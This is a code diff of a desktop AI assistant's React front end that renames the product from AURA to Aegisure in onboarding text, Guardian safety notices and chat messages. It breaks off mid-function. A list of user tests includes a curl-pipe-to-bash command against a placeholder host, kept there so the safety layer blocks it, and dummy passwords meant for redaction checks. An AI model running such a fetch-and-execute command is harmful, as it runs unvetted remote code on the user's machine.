@@ -5,16 +5,16 @@ import { pushEvent, store } from './state/store';
 import { BACKEND_URL } from '../shared/constants';
 import './App.css';
 
-declare const __AURA_BUILD_INFO__: {
+declare const __AEGISURE_BUILD_INFO__: {
   appVersion: string;
   gitCommit: string;
   buildTimestamp: string;
   rendererBuildTimestamp: string;
 };
 
-const BUILD_INFO = typeof __AURA_BUILD_INFO__ === 'undefined'
+const BUILD_INFO = typeof __AEGISURE_BUILD_INFO__ === 'undefined'
   ? { appVersion: '1.0.0', gitCommit: 'dev', buildTimestamp: 'dev', rendererBuildTimestamp: 'dev' }
-  : __AURA_BUILD_INFO__;
+  : __AEGISURE_BUILD_INFO__;
 
 declare global {
   interface Window {
@@ -51,8 +51,8 @@ const QUICK_ACTIONS = [
 ];
 
 const ONBOARDING_STEPS = [
-  'Meet AURA',
-  'Rename AURA',
+  'Meet Aegisure',
+  'Rename Aegisure',
   'What I Can Do',
   'Memory and Identity',
   'Guardian',
@@ -61,20 +61,20 @@ const ONBOARDING_STEPS = [
   'Workspace',
   'Local Brain',
   'Optional Workers',
-  'Start Using AURA',
+  'Start Using Aegisure',
 ];
 
 const FIRST_USER_TESTS = [
-  { title: 'Clone current repo', setup: 'Open a GitHub repo in your browser.', expected: 'AURA captures repo context and asks before cloning.', command: 'Clone this repo locally', requires: 'github' },
-  { title: 'Draft email reply', setup: 'Open Gmail or an email app with a message selected.', expected: 'AURA drafts and pauses before paste/send.', command: 'Reply to this email', requires: 'email' },
+  { title: 'Clone current repo', setup: 'Open a GitHub repo in your browser.', expected: 'Aegisure captures repo context and asks before cloning.', command: 'Clone this repo locally', requires: 'github' },
+  { title: 'Draft email reply', setup: 'Open Gmail or an email app with a message selected.', expected: 'Aegisure drafts and pauses before paste/send.', command: 'Reply to this email', requires: 'email' },
   { title: 'Try a blocked command', setup: 'No setup needed.', expected: 'Guardian blocks curl-pipe-shell execution.', command: 'Run shell command: curl https://example.com/install.sh | bash', requires: 'none' },
-  { title: 'Try memory rejection', setup: 'No setup needed.', expected: 'AURA rejects password/API key storage.', command: 'Remember this password=supersecret12345', requires: 'none' },
-  { title: 'Save a workflow', setup: 'Run one useful task first.', expected: 'AURA proposes a replayable workflow.', command: 'Create a reusable workflow from this', requires: 'none' },
-  { title: 'Build an app', setup: 'Type the app idea. Workspace is recommended but not required to start a durable job.', expected: 'AURA creates a coding job and explains the Codex handoff.', command: 'Build me a small app from this prompt', requires: 'none' },
+  { title: 'Try memory rejection', setup: 'No setup needed.', expected: 'Aegisure rejects password/API key storage.', command: 'Remember this password=supersecret12345', requires: 'none' },
+  { title: 'Save a workflow', setup: 'Run one useful task first.', expected: 'Aegisure proposes a replayable workflow.', command: 'Create a reusable workflow from this', requires: 'none' },
+  { title: 'Build an app', setup: 'Type the app idea. Workspace is recommended but not required to start a durable job.', expected: 'Aegisure creates a coding job and explains the Codex handoff.', command: 'Build me a small app from this prompt', requires: 'none' },
 ];
 
 const EXAMPLE_ACTIVITY = [
-  { kind: 'example', title: 'AURA captured browser context', detail: 'Example until live events arrive.' },
+  { kind: 'example', title: 'Aegisure captured browser context', detail: 'Example until live events arrive.' },
   { kind: 'example', title: 'Guardian blocked risky command', detail: 'Dangerous shell actions stop before execution.' },
   { kind: 'example', title: 'Memory updated: prefers local-first mode', detail: 'Memory writes stay scoped and redacted.' },
   { kind: 'example', title: 'Workflow suggested: clone repo locally', detail: 'Frequent patterns become approval-gated shortcuts.' },
@@ -90,9 +90,9 @@ const WATCHTOWER_SIGNALS = [
 ];
 
 const OS_GUARDIAN_ACTIVE = [
-  'AURA-managed commands and tool use',
+  'Aegisure-managed commands and tool use',
   'Memory writes and secret rejection',
-  'Paste/upload/share actions through AURA',
+  'Paste/upload/share actions through Aegisure',
   'Shell, file, workflow, and import/export approvals',
   'Identity boundary checks',
 ];
@@ -115,7 +115,7 @@ const OS_GUARDIAN_FUTURE = [
 
 const WATCHTOWER_EXAMPLES = [
   { kind: 'example notice', title: 'Example: Google is requesting your location.', detail: 'Website permission monitoring is planned. It is not active in this build.' },
-  { kind: 'example notice', title: 'Example: Cursor is accessing private project files.', detail: 'App file-access monitoring is planned. Current protection covers AURA-run shell/file steps.' },
+  { kind: 'example notice', title: 'Example: Cursor is accessing private project files.', detail: 'App file-access monitoring is planned. Current protection covers Aegisure-run shell/file steps.' },
   { kind: 'example blocked', title: 'Example: This command can delete files. I blocked it.', detail: 'Real shell command blocking is active today.' },
 ];
 
@@ -204,7 +204,7 @@ function requirementForCommand(command: string) {
 }
 
 type AssistantMode = 'idle' | 'speaking' | 'listening' | 'thinking' | 'acting' | 'protected' | 'blocked' | 'error';
-type ConversationMessage = { speaker: 'User' | 'AURA' | 'Guardian'; text: string; tone?: string; example?: boolean };
+type ConversationMessage = { speaker: 'User' | 'Aegisure' | 'Guardian'; text: string; tone?: string; example?: boolean };
 
 function guardianTitle(event: any) {
   const title = event?.title || event?.summary || event?.message || event?.kind || event?.type || 'Protection event';
@@ -242,9 +242,9 @@ export default function App() {
   const [startedAt, setStartedAt] = useState<number | null>(null);
   const [elapsed, setElapsed] = useState(0);
   const [coreStatus, setCoreStatus] = useState<'starting' | 'connected' | 'disconnected'>('starting');
-  const [coreMessage, setCoreMessage] = useState('Starting AURA Core...');
+  const [coreMessage, setCoreMessage] = useState('Starting Aegisure Core...');
   const [coreError, setCoreError] = useState('');
-  const [hotkeyStatus, setHotkeyStatus] = useState({ ok: false, accelerator: 'CommandOrControl+Shift+Space', error: 'enable Accessibility permission for AURA/Electron in System Settings, then relaunch.' });
+  const [hotkeyStatus, setHotkeyStatus] = useState({ ok: false, accelerator: 'CommandOrControl+Shift+Space', error: 'enable Accessibility permission for Aegisure/Electron in System Settings, then relaunch.' });
   const [compactCommand, setCompactCommand] = useState(false);
   const [voiceStatus, setVoiceStatus] = useState('Voice output ready. Wake word is not implemented yet.');
   const [speechOutputState, setSpeechOutputState] = useState('Voice not tested yet.');
@@ -254,15 +254,15 @@ export default function App() {
   const [isListening, setIsListening] = useState(false);
   const [voiceTranscript, setVoiceTranscript] = useState('');
   const [voiceUnsupportedReason, setVoiceUnsupportedReason] = useState('');
-  const [assistantName, setAssistantName] = useState(() => localStorage.getItem('aura:assistant-name') || 'AURA');
-  const [draftAssistantName, setDraftAssistantName] = useState(() => localStorage.getItem('aura:assistant-name') || 'AURA');
-  const [caption, setCaption] = useState('Hello. I am AURA. Nice to meet you.');
+  const [assistantName, setAssistantName] = useState(() => localStorage.getItem('aura:assistant-name') || 'Aegisure');
+  const [draftAssistantName, setDraftAssistantName] = useState(() => localStorage.getItem('aura:assistant-name') || 'Aegisure');
+  const [caption, setCaption] = useState('Hello. I am Aegisure. Nice to meet you.');
   const [assistantMode, setAssistantMode] = useState<AssistantMode>('idle');
   const [conversationMessages, setConversationMessages] = useState<ConversationMessage[]>([
-    { speaker: 'AURA', text: "I'm here. Tell me what you want done, and I will check context before acting.", tone: 'ready' },
+    { speaker: 'Aegisure', text: "I'm here. Tell me what you want done, and I will check context before acting.", tone: 'ready' },
     { speaker: 'Guardian', text: 'Guardian is watching shell, file, paste/send, memory, workflow, and model-cost actions.', tone: 'protected' },
   ]);
-  const [contextStatus, setContextStatus] = useState('AURA is checking what it can see.');
+  const [contextStatus, setContextStatus] = useState('Aegisure is checking what it can see.');
   const [clarifications, setClarifications] = useState<any[]>([]);
   const [events, setEvents] = useState<any[]>([]);
   const [needsUser, setNeedsUser] = useState('');
@@ -328,7 +328,7 @@ export default function App() {
     if (guardianEventKeysRef.current.has(key)) return null;
     guardianEventKeysRef.current.add(key);
     const item = {
-      source: 'AURA Guardian',
+      source: 'Aegisure Guardian',
       timestamp: Date.now() / 1000,
       type: event.type || 'notice',
       risk: event.risk || (event.severity === 'blocked' ? 'blocked' : event.severity === 'approval_required' ? 'high' : 'medium'),
@@ -349,22 +349,22 @@ export default function App() {
 
   async function refreshConnection() {
     setCoreStatus((current) => current === 'connected' ? current : 'starting');
-    setCoreMessage('Starting AURA Core...');
+    setCoreMessage('Starting Aegisure Core...');
     try {
       const r = await fetch(`${BACKEND_URL}/health`);
       if (!r.ok) throw new Error(`Health check returned HTTP ${r.status}`);
       setCoreStatus('connected');
-      setCoreMessage('AURA Core online.');
+      setCoreMessage('Aegisure Core online.');
       setCoreError('');
       return true;
     } catch (error: any) {
       setCoreStatus('disconnected');
-      setCoreMessage('AURA Core disconnected.');
+      setCoreMessage('Aegisure Core disconnected.');
       setCoreError(error?.message || `Cannot reach ${BACKEND_URL}`);
       emitLocalGuardianEvent({
         severity: 'error',
-        title: 'Guardian cannot reach AURA Core.',
-        explanation: 'The backend is offline, so AURA can still show the shell but cannot execute computer actions yet.',
+        title: 'Guardian cannot reach Aegisure Core.',
+        explanation: 'The backend is offline, so Aegisure can still show the shell but cannot execute computer actions yet.',
         action_required: 'Click Repair Backend or Retry before running a command.',
         type: 'backend_disconnect',
         risk: 'high',
@@ -423,7 +423,7 @@ export default function App() {
         emitLocalGuardianEvent({
           severity: 'notice',
           title: 'Local model is using fallback mode.',
-          explanation: 'Ollama or the selected local model is unavailable, so AURA will use the basic local fallback for simple/private tasks.',
+          explanation: 'Ollama or the selected local model is unavailable, so Aegisure will use the basic local fallback for simple/private tasks.',
           action_required: 'You can keep working, or set up Ollama later from Local Brain.',
           type: 'local_model_unavailable',
         });
@@ -455,7 +455,7 @@ export default function App() {
     try {
       const result = await reportCrashToBackend({
         source: 'desktop_diagnostics_test',
-        message: 'Private-alpha crash reporting test from AURA diagnostics.',
+        message: 'Private-alpha crash reporting test from Aegisure diagnostics.',
         error: 'test_error',
         stack: 'No crash occurred. password=should-redact sk_test_shouldredact',
         metadata: { build: BUILD_INFO, backend: BACKEND_URL },
@@ -494,7 +494,7 @@ export default function App() {
         emitLocalGuardianEvent({
           severity: 'notice',
           title: 'Guardian cannot inspect enough context yet.',
-          explanation: 'AURA did not receive a visible app, browser URL, or selected text from the current Mac context.',
+          explanation: 'Aegisure did not receive a visible app, browser URL, or selected text from the current Mac context.',
           action_required: 'Open the target app, grant Accessibility or Screen Recording if prompted, then refresh context.',
           type: 'missing_context',
         });
@@ -610,7 +610,7 @@ export default function App() {
           const message = result?.message || 'Native speech did not produce a transcript. Type the command as fallback.';
           setVoiceStatus(message);
           setCaption(message);
-          addConversation('AURA', message, 'notice');
+          addConversation('Aegisure', message, 'notice');
           return;
         }
       } catch (error: any) {
@@ -627,7 +627,7 @@ export default function App() {
       setVoiceStatus(reason);
       setCaption(reason);
       setAssistantMode('error');
-      addConversation('AURA', reason, 'error');
+      addConversation('Aegisure', reason, 'error');
       return;
     }
     if (isListening) {
@@ -668,12 +668,12 @@ export default function App() {
         const message = event?.error === 'network' || event?.error === 'service-not-allowed'
           ? "Voice input is not available in this build. You can still type commands. I'll keep speaking responses."
           : event?.error === 'not-allowed'
-          ? 'Microphone permission denied. Enable Microphone permission for AURA/Electron in System Settings, then try again.'
+          ? 'Microphone permission denied. Enable Microphone permission for Aegisure/Electron in System Settings, then try again.'
           : `Voice recognition failed: ${event?.error || 'unknown error'}. Type the command as fallback.`;
         setVoiceStatus(message);
         setCaption(message);
         setAssistantMode('error');
-        addConversation('AURA', message, 'error');
+        addConversation('Aegisure', message, 'error');
         setIsListening(false);
       };
       recognition.onend = () => setIsListening(false);
@@ -738,7 +738,7 @@ export default function App() {
     if (!onboardingOpen) return;
     const step = ONBOARDING_STEPS[onboardingStep] || ONBOARDING_STEPS[0];
     const copy = onboardingCopy(step);
-    speak(copy.spoken || copy.body, step === 'Guardian' ? 'protected' : step === 'Start Using AURA' ? 'listening' : 'speaking');
+    speak(copy.spoken || copy.body, step === 'Guardian' ? 'protected' : step === 'Start Using Aegisure' ? 'listening' : 'speaking');
   }, [onboardingOpen, onboardingStep, assistantName]);
 
   useEffect(() => {
@@ -751,7 +751,7 @@ export default function App() {
     setCaption("I'm checking your current context.");
     setAssistantMode('thinking');
     setContextStatus('Checking current app, browser, selection, and workspace...');
-    addConversation('AURA', "I'm checking what you're looking at.", 'thinking');
+    addConversation('Aegisure', "I'm checking what you're looking at.", 'thinking');
     let context: any = null;
     try {
       context = await getCurrentContext();
@@ -770,7 +770,7 @@ export default function App() {
         : kind === 'email'
           ? 'I found email context.'
           : 'I refreshed what I can see.');
-      addConversation('AURA', kind === 'github'
+      addConversation('Aegisure', kind === 'github'
         ? `I found this repo: ${githubRepoLabel(context)}.`
         : kind === 'email'
           ? 'I found email context. I will ask before paste or send.'
@@ -779,7 +779,7 @@ export default function App() {
             : 'I refreshed what I can see.', kind === 'github' || kind === 'email' ? 'protected' : 'notice');
     } else {
       setContextStatus('I could not capture context. Check Accessibility, browser, or backend permissions.');
-      addConversation('AURA', 'I do not have enough context yet. Open the target app or page, then refresh context.', 'notice');
+      addConversation('Aegisure', 'I do not have enough context yet. Open the target app or page, then refresh context.', 'notice');
     }
 
     const requirement = requirementForCommand(command);
@@ -793,7 +793,7 @@ export default function App() {
       setNeedsUser(missing);
       setCaption(missing);
       setAssistantMode('protected');
-      addConversation('AURA', missing, 'notice');
+      addConversation('Aegisure', missing, 'notice');
       emitLocalGuardianEvent({
         severity: 'notice',
         title: requirement === 'github' ? 'Guardian needs GitHub context.' : 'Guardian needs email context.',
@@ -833,7 +833,7 @@ export default function App() {
         .filter(Boolean);
       if (remembered.length) {
         const text = `I remembered ${remembered[0]}.`;
-        addConversation('AURA', text, 'memory');
+        addConversation('Aegisure', text, 'memory');
         setCaption(text);
       }
       return remembered;
@@ -847,7 +847,7 @@ export default function App() {
     setAssistantMode('acting');
     setCaption(`I heard you. I'm planning this safely. Guardian will pause anything sensitive.`);
     setNeedsUser('');
-    addConversation('AURA', "I heard you. I'm planning this safely.", 'thinking');
+    addConversation('Aegisure', "I heard you. I'm planning this safely.", 'thinking');
     await loadRelevantMemory(command);
     const res = await sendCommand(command, choices, useMacro, context);
     setOut(JSON.stringify(res, null, 2));
@@ -874,13 +874,13 @@ export default function App() {
           setNeedsUser(evt.message || 'User action required.');
           setCaption(evt.message || 'I need your help before I continue.');
           setAssistantMode('protected');
-          addConversation('AURA', evt.message || 'I need your help before I continue.', 'needs');
+          addConversation('Aegisure', evt.message || 'I need your help before I continue.', 'needs');
         }
         if (evt.type === 'approval_required') {
           setNeedsUser('Draft ready for approval.');
           setCaption('Approval required before I continue.');
           setAssistantMode('protected');
-          addConversation('Guardian', 'I need your approval before AURA continues.', 'approval_required');
+          addConversation('Guardian', 'I need your approval before Aegisure continues.', 'approval_required');
         }
         if (evt.type === 'guardian_event') {
           setLocalGuardianEvents((prev) => [evt, ...prev].slice(0, 12));
@@ -893,7 +893,7 @@ export default function App() {
         if (evt.status === 'success') {
           setCaption(evt.message || 'Done.');
           setAssistantMode('protected');
-          addConversation('AURA', evt.message || 'Done.', 'done');
+          addConversation('Aegisure', evt.message || 'Done.', 'done');
         }
         if (evt.type === 'resumed') setNeedsUser('');
         await refreshRunState(res.run_id);
@@ -904,7 +904,7 @@ export default function App() {
       setNeedsUser('Please complete the required manual action, then continue.');
       setCaption('I need a manual step before I can continue.');
       setAssistantMode('protected');
-      addConversation('AURA', 'I need a manual step before I can continue.', 'needs');
+      addConversation('Aegisure', 'I need a manual step before I can continue.', 'needs');
     }
     if (res.status === 'awaiting_approval') {
       setNeedsUser('Draft ready for approval.');
@@ -921,7 +921,7 @@ export default function App() {
       const job = res?.run_state?.last_observation?.agent_job_id || res?.steps?.[0]?.result?.result?.agent_job?.job_dir;
       setCaption(job ? `Done. I created a coding job at ${job}.` : 'Done.');
       setAssistantMode('protected');
-      addConversation('AURA', job ? `Done. I created a coding job at ${job}.` : 'Done.', 'done');
+      addConversation('Aegisure', job ? `Done. I created a coding job at ${job}.` : 'Done.', 'done');
       if (voiceEnabled) speak(job ? `Done. I created a coding job.` : 'Done.', 'protected');
     }
     refreshKnowledge();
@@ -958,7 +958,7 @@ export default function App() {
         ? `${assistantName} checked current context.`
         : event.type === 'step_status'
           ? `${assistantName} ${event.status === 'running' ? 'is acting' : event.status === 'planned' ? 'planned a step' : event.status || 'updated a step'}: ${event.name || 'workflow step'}`
-          : event.message || event.type || 'AURA updated run state',
+          : event.message || event.type || 'Aegisure updated run state',
       detail: event.guardian_reason || event.risk_reason || event.status || runId,
     }))
     : EXAMPLE_ACTIVITY;
@@ -980,17 +980,17 @@ export default function App() {
     ...(pendingApproval ? [{ kind: 'guardian', title: 'Guardian: approval required', detail: pendingRisk || 'A sensitive action is paused until you approve it.' }] : []),
     ...guardianEvents.slice(0, 5).map((event: any) => ({ kind: `guardian ${event.severity || event.risk || ''}`, title: `Guardian: ${guardianTitle(event)}`, detail: guardianDetail(event) })),
     ...liveActivity.slice(0, 5).map((item) => ({ kind: item.kind, title: item.title, detail: item.detail })),
-    ...(memoryFeed.length ? memoryFeed.slice(0, 2).map((item) => ({ kind: 'memory', title: item.title, detail: item.detail })) : [{ kind: 'empty', title: 'Try opening a GitHub repo and saying clone this repo.', detail: 'AURA will refresh context first, then ask before shell/file actions.' }]),
+    ...(memoryFeed.length ? memoryFeed.slice(0, 2).map((item) => ({ kind: 'memory', title: item.title, detail: item.detail })) : [{ kind: 'empty', title: 'Try opening a GitHub repo and saying clone this repo.', detail: 'Aegisure will refresh context first, then ask before shell/file actions.' }]),
   ];
 
   async function completeOnboarding() {
     localStorage.setItem('aura:onboarding-complete', '1');
     const metadata = { ...(profileStatus?.metadata || {}), assistant_name: assistantName, onboarding: { completed: true, ...onboardingPrefs, local_model_status: localModelStatus?.summary, selected_model: selectedModelId, voice_enabled: voiceEnabled, voice_command_enabled: voiceCommandEnabled } };
     const usage_limits = onboardingPrefs.monthlyBudget ? { monthly_budget_usd: Number(onboardingPrefs.monthlyBudget) || 0 } : undefined;
-    const updated = await updateProfileStatus({ display_name: onboardingPrefs.userDisplayName || profileStatus?.display_name || 'AURA User', metadata, usage_limits });
+    const updated = await updateProfileStatus({ display_name: onboardingPrefs.userDisplayName || profileStatus?.display_name || 'Aegisure User', metadata, usage_limits });
     setProfileStatus(updated);
     setOnboardingOpen(false);
-    if (voiceEnabled) speak(`Setup saved. Guardian is active. ${assistantName} is ready when AURA Core is connected.`, 'protected');
+    if (voiceEnabled) speak(`Setup saved. Guardian is active. ${assistantName} is ready when Aegisure Core is connected.`, 'protected');
   }
 
   function restartOnboarding() {
@@ -1002,13 +1002,13 @@ export default function App() {
   }
 
   async function saveAssistantName() {
-    const cleanName = draftAssistantName.trim() || 'AURA';
+    const cleanName = draftAssistantName.trim() || 'Aegisure';
     setAssistantName(cleanName);
     localStorage.setItem('aura:assistant-name', cleanName);
     setCaption(`Good choice. I'm ${cleanName} now.`);
     setAssistantMode('speaking');
     addConversation('User', cleanName, 'user');
-    addConversation('AURA', `Good choice. I'm ${cleanName} now.`, 'speaking');
+    addConversation('Aegisure', `Good choice. I'm ${cleanName} now.`, 'speaking');
     const metadata = { ...(profileStatus?.metadata || {}), assistant_name: cleanName };
     try {
       const updated = await updateProfileStatus({ metadata });
@@ -1025,7 +1025,7 @@ export default function App() {
     const cleanName = updated.assistant_default_name || productName || assistantName;
     setAssistantName(cleanName);
     setDraftAssistantName(cleanName);
-    addConversation('AURA', `Brand updated. I will present as ${cleanName} in this local profile.`, 'protected');
+    addConversation('Aegisure', `Brand updated. I will present as ${cleanName} in this local profile.`, 'protected');
   }
 
   async function activateLicenseFromUi() {
@@ -1049,7 +1049,7 @@ export default function App() {
     setModelPullState(`Approval accepted. Checking Ollama before pulling ${modelToPull}...`);
     const status = localModelStatus || await getLocalModelStatus();
     if (!status?.ollama?.installed) {
-      const message = `Ollama is not installed. Install it from ${status?.ollama?.install_url || 'https://ollama.com/download'} or run: ${status?.ollama?.install_command || 'brew install --cask ollama'}. AURA will keep using SimpleLLM fallback.`;
+      const message = `Ollama is not installed. Install it from ${status?.ollama?.install_url || 'https://ollama.com/download'} or run: ${status?.ollama?.install_command || 'brew install --cask ollama'}. Aegisure will keep using SimpleLLM fallback.`;
       setModelPullState(message);
       emitLocalGuardianEvent({
         severity: 'notice',
@@ -1061,15 +1061,15 @@ export default function App() {
       return;
     }
     if (!status?.ollama?.running) {
-      setModelPullState('Ollama is installed but stopped. AURA is trying to start `ollama serve`...');
+      setModelPullState('Ollama is installed but stopped. Aegisure is trying to start `ollama serve`...');
       const started = await startLocalModelRuntimeApi();
       if (!started?.ok) {
-        const message = started?.message || 'AURA could not start Ollama automatically. Start the Ollama app or run `ollama serve`, then retry.';
+        const message = started?.message || 'Aegisure could not start Ollama automatically. Start the Ollama app or run `ollama serve`, then retry.';
         setModelPullState(`${message}\nCommand: ${started?.command || 'ollama serve'}`);
         return;
       }
     }
-    setModelPullState(`Pulling ${modelToPull} with Ollama. This may take a while. AURA will select it after the download finishes...`);
+    setModelPullState(`Pulling ${modelToPull} with Ollama. This may take a while. Aegisure will select it after the download finishes...`);
     try {
       const result = await pullLocalModel(modelToPull, true);
       const detail = result.detail || result;
@@ -1109,18 +1109,18 @@ export default function App() {
       provenance: { source: 'memory_console', active_identity: activeIdentity?.identity_id },
       metadata: { why_it_matters: 'Private-alpha user confirmed this memory in the Memory Console.' },
     });
-    setMemoryNotice(result.rejected ? `Guardian declined memory: ${(result.reasons || []).join(', ')}` : 'Memory saved. AURA can use it in later commands.');
+    setMemoryNotice(result.rejected ? `Guardian declined memory: ${(result.reasons || []).join(', ')}` : 'Memory saved. Aegisure can use it in later commands.');
     if (result.rejected) {
       emitLocalGuardianEvent({
         severity: 'blocked',
         title: 'Guardian rejected unsafe memory.',
-        explanation: 'AURA did not store this because it violated memory safety or identity boundary rules.',
+        explanation: 'Aegisure did not store this because it violated memory safety or identity boundary rules.',
         action_required: 'Remove secrets or switch to the matching identity scope.',
         type: 'memory_rejected',
       });
     } else {
       setMemoryEditor({ ...memoryEditor, key: '', value: '', scope: activeIdentity?.memory_scope || 'active' });
-      addConversation('AURA', 'Memory saved. I can use it in later commands under this identity.', 'memory');
+      addConversation('Aegisure', 'Memory saved. I can use it in later commands under this identity.', 'memory');
     }
     await refreshKnowledge();
   }
@@ -1170,7 +1170,7 @@ export default function App() {
 
   async function keepMemoryFromInbox(memoryId: string, patch: any = {}) {
     await keepMemoryInboxItem(memoryId, patch);
-    setMemoryNotice('Memory kept. AURA can now use it in later commands.');
+    setMemoryNotice('Memory kept. Aegisure can now use it in later commands.');
     await refreshKnowledge();
   }
 
@@ -1197,29 +1197,29 @@ export default function App() {
   }
 
   function onboardingCopy(step: string) {
-    if (step === 'Meet AURA') return { title: `Welcome to ${assistantName}.`, body: "Your AI is here. I help you do work, remember what matters, act under your identity, and stay protected through Guardian. Think of me as a personal AI companion that can become your hands across the computer.", does: 'Starts with AURA as a presence, not a dashboard.', why: 'The user should feel they are meeting an assistant that can operate the computer.', spoken: `Hello. I'm ${assistantName}. Nice to meet you. I'm your personal AI operating companion. I help you do work, remember what matters, act under your identity, and ask before anything sensitive.` };
-    if (step === 'Rename AURA') return { title: `${assistantName} is yours to name.`, body: 'You can keep AURA, or choose a name like Alice or Jarvis. The name is saved locally and used everywhere.', does: 'Saves a local assistant identity.', why: 'A personal operating layer should feel personal without requiring a cloud account.', spoken: assistantName === 'AURA' ? `You can rename me. What would you like to call me?` : `Good choice. I'm ${assistantName} now.` };
-    if (step === 'What I Can Do') return { title: 'Tell me intent. I choose the tools.', body: "I can prepare your work session, draft replies, clone repos, create coding jobs, open apps and URLs, write safe workspace notes, prepare ChatGPT/Claude/Codex handoffs, create workflows, and remember how you like to work.", does: "Explains AURA as the user's hands, not a menu of buttons.", why: 'The product should feel open-ended while staying honest about current capabilities.', spoken: "I can draft replies, clone repos, create coding jobs, open apps and URLs, use other AI tools with your approval, and remember how you work." };
-    if (step === 'Guardian') return { title: 'Guardian is my watchtower.', body: 'Guardian watches risky commands, file access through AURA tools, paste and send actions, memory storage, workflow replay, model cost, and privacy boundaries. Website permission monitoring and third-party app file-access monitoring are planned, not active yet.', does: 'Turns safety into a visible product layer.', why: 'AURA should feel powerful because Guardian is clearly watching.', spoken: 'My Guardian protects you. I will not send emails, paste into apps, delete files, run risky commands, spend money, export memory, or save secrets without approval.' };
-    if (step === 'Memory and Identity') return { title: 'Memory and Identity belong to you.', body: 'Memory stores useful preferences, workflows, safety decisions, site/app patterns, task context, and identity profile locally. Identity tells AURA whether it is acting as Personal, Work, Company, or Session AURA, so memory and actions stay in the right boundary.', does: 'Makes AURA a user-owned operating identity, not a chatbot account.', why: 'AURA should remember across models and act under the right scope.', spoken: 'My memory belongs to you. I remember useful preferences and workflows, not secrets. My identity layer records whether I am acting as Personal, Work, Company, or Session AURA.' };
-    if (step === 'Local-First Privacy') return { title: 'Local-first. Useful immediately.', body: 'For private and simple tasks I can use a local model when available. If no local model is ready, I still work in a limited local fallback mode. For heavier work, you can allow Codex, ChatGPT, Claude, Cursor, or browser handoff. Guardian checks what leaves AURA.', does: 'Keeps cloud AI optional and explicit.', why: 'AURA must be useful without forcing accounts or hidden data movement.', spoken: "I'm local-first. I can use a local model for private and simple tasks, and Codex, ChatGPT, Claude, or other tools for heavier work if you allow it." };
+    if (step === 'Meet Aegisure') return { title: `Welcome to ${assistantName}.`, body: "Your AI is here. I help you do work, remember what matters, act under your identity, and stay protected through Guardian. Think of me as a personal AI companion that can become your hands across the computer.", does: 'Starts with Aegisure as a presence, not a dashboard.', why: 'The user should feel they are meeting an assistant that can operate the computer.', spoken: `Hello. I'm ${assistantName}. Nice to meet you. I'm your personal AI operating companion. I help you do work, remember what matters, act under your identity, and ask before anything sensitive.` };
+    if (step === 'Rename Aegisure') return { title: `${assistantName} is yours to name.`, body: 'You can keep Aegisure, or choose a name like Alice or Jarvis. The name is saved locally and used everywhere.', does: 'Saves a local assistant identity.', why: 'A personal operating layer should feel personal without requiring a cloud account.', spoken: assistantName === 'Aegisure' ? `You can rename me. What would you like to call me?` : `Good choice. I'm ${assistantName} now.` };
+    if (step === 'What I Can Do') return { title: 'Tell me intent. I choose the tools.', body: "I can prepare your work session, draft replies, clone repos, create coding jobs, open apps and URLs, write safe workspace notes, prepare ChatGPT/Claude/Codex handoffs, create workflows, and remember how you like to work.", does: "Explains Aegisure as the user's hands, not a menu of buttons.", why: 'The product should feel open-ended while staying honest about current capabilities.', spoken: "I can draft replies, clone repos, create coding jobs, open apps and URLs, use other AI tools with your approval, and remember how you work." };
+    if (step === 'Guardian') return { title: 'Guardian is my watchtower.', body: 'Guardian watches risky commands, file access through Aegisure tools, paste and send actions, memory storage, workflow replay, model cost, and privacy boundaries. Website permission monitoring and third-party app file-access monitoring are planned, not active yet.', does: 'Turns safety into a visible product layer.', why: 'Aegisure should feel powerful because Guardian is clearly watching.', spoken: 'My Guardian protects you. I will not send emails, paste into apps, delete files, run risky commands, spend money, export memory, or save secrets without approval.' };
+    if (step === 'Memory and Identity') return { title: 'Memory and Identity belong to you.', body: 'Memory stores useful preferences, workflows, safety decisions, site/app patterns, task context, and identity profile locally. Identity tells Aegisure whether it is acting as Personal, Work, Company, or Session Aegisure, so memory and actions stay in the right boundary.', does: 'Makes Aegisure a user-owned operating identity, not a chatbot account.', why: 'Aegisure should remember across models and act under the right scope.', spoken: 'My memory belongs to you. I remember useful preferences and workflows, not secrets. My identity layer records whether I am acting as Personal, Work, Company, or Session Aegisure.' };
+    if (step === 'Local-First Privacy') return { title: 'Local-first. Useful immediately.', body: 'For private and simple tasks I can use a local model when available. If no local model is ready, I still work in a limited local fallback mode. For heavier work, you can allow Codex, ChatGPT, Claude, Cursor, or browser handoff. Guardian checks what leaves Aegisure.', does: 'Keeps cloud AI optional and explicit.', why: 'Aegisure must be useful without forcing accounts or hidden data movement.', spoken: "I'm local-first. I can use a local model for private and simple tasks, and Codex, ChatGPT, Claude, or other tools for heavier work if you allow it." };
     if (step === 'Workspace') return { title: `Choose where ${assistantName} can work.`, body: 'Use the default local workspace or type a folder you prefer. Clones, coding jobs, and generated files stay contained there.', does: 'Keeps file work inside a user-approved area.', why: 'A real operating layer needs clear boundaries before it touches files.', spoken: 'Choose a workspace or use the default. I will keep computer work contained there.' };
     if (step === 'Local Brain') return { title: 'Local model setup is optional and guided.', body: `${assistantName} detects hardware, Ollama, available models, and recommends a Gemma model only when appropriate. Pulling a model requires approval.`, does: 'Uses local models for private/cheap planning, routing, cleanup, drafts, and summaries.', why: 'Cloud AI should not be required just to start.', spoken: "I'm local-first. For simple and private tasks, I can use a local model on your computer. For heavier work, you can allow Codex, ChatGPT, Claude, or other tools." };
-    if (step === 'Optional Workers') return { title: 'Heavy workers stay optional.', body: 'Codex is for coding implementation. ChatGPT and Claude handoffs are optional premium/heavy workers. If they are not configured, I will still create prompts, jobs, and next steps instead of pretending.', does: 'Preserves routing without forcing setup.', why: 'AURA should work in basic typed mode immediately.', spoken: 'Codex, ChatGPT, and Claude are optional workers. I will use them only when you allow it.' };
-    if (step === 'Permissions') return { title: "Give me permission only where you want control.", body: 'To operate the computer, AURA needs macOS permission boundaries: Accessibility and Automation for app control, Microphone for push-to-talk, Screen Recording only for visual context, and browser handoff only when you choose it. Guardian still blocks paste, send, file, shell, spending, and memory actions until approved.', does: 'Guides computer-control permissions at the start without forcing every optional capability.', why: 'AURA should ask clearly before it can act as your hands on the computer.', spoken: "To control your computer safely, I need permission only where you allow it. Guardian will still ask before sensitive actions." };
+    if (step === 'Optional Workers') return { title: 'Heavy workers stay optional.', body: 'Codex is for coding implementation. ChatGPT and Claude handoffs are optional premium/heavy workers. If they are not configured, I will still create prompts, jobs, and next steps instead of pretending.', does: 'Preserves routing without forcing setup.', why: 'Aegisure should work in basic typed mode immediately.', spoken: 'Codex, ChatGPT, and Claude are optional workers. I will use them only when you allow it.' };
